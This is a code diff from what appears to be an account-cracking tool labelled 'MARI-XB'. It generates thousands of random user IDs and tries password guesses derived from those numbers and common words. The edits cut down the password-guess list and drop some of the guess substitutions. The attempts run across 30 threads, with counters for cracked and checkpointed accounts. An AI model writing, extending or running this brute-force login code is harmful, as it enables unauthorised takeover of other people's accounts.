@@ -88,7 +88,7 @@ def random_number():
         limit = 5000
     for i in range(limit):
         user_ID.append(str(random.randint(1111111, 9999999)))
-    pwx = ['first7digit','last7digit','first6digit,''last6digit','fullnumber','khankhan','khan12345','khan123','baloch123','khan1122','baloch','kingkhan','afghanistan','pakistan','786786','full_number']
+    pwx = ['first6digit','full_number','57273200']
     with ThreadPool(max_workers=30) as BilalHaiderID:
         total = str(len(user_ID))
         logo()
@@ -152,8 +152,6 @@ def bapi(uid,pwx,total):
         fullnumber = uid
         sys.stdout.write(f'\r\r[{green}MARI-XB{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
         for pw in pwx:
-            pw = pw.replace("last7digit",last7digit)
-            pw = pw.replace("last6digit",last6digit)
             pw = pw.replace("first6digit",first6digit)
             pw = pw.replace("fullnumber",fullnumber)
             useragent = str(ua_api())
